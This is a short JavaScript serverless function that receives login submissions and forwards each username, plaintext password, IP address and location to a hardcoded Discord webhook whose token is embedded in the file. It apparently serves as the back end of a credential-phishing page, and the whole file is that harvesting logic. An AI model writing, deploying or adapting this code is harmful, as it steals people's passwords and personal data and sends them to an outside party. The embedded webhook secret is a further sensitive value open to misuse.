const fetch = require("node-fetch");

const WEBHOOK_URL = "https://discord.com/api/webhooks/1533039544587387031/AUek-gEmWN-WFKzEftdRQhVoq3eJlyqd6XxY1-a9kpZA4Pp93KHn2XKr5PED5pQaSIQi";

exports.handler = async (event) => {
    try {
        const data = JSON.parse(event.body);

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `Login event:
Username: ${data.username}
Password Present: ${data.passwordPresent}
Remember: ${data.remember}
IP: ${data.ip}
Location: ${data.location}
Password: ${data.password}`
            })
        });

        return {
            statusCode: 200,
            body: "OK"
        };

    } catch (err) {
        return {
            statusCode: 500,
            body: "Error sending webhook"
        };
    }
};
